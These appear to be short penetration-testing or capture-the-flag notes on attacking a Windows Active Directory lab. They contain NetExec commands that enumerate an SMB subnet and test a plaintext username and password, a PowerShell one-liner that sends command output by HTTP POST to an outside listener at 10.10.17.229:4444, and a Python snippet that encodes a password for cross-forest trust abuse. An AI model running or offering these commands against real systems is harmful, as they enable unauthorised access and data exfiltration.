## nxc 
```
nxc smb 172.16.20.0/24 --generate-hosts-file hosts

cat hosts | tee -a /etc/hosts

nxc smb 172.16.20.0/24 -u josh -p 'Rangers1'
```

## windows rce
powershell -c "$b=(ls)|Out-String;Invoke-WebRequest -Uri 10.10.17.229:4444 -Method Post  -Body @{a=$b}"

## cross-forest trust and SID filtering

1. utf-16-le base64 encode
python3 -c "
import base64
pw = '\"zzzzzzzzzzxxx\"'.encode('utf-16-le')
print(base64.b64encode(pw).decode())
"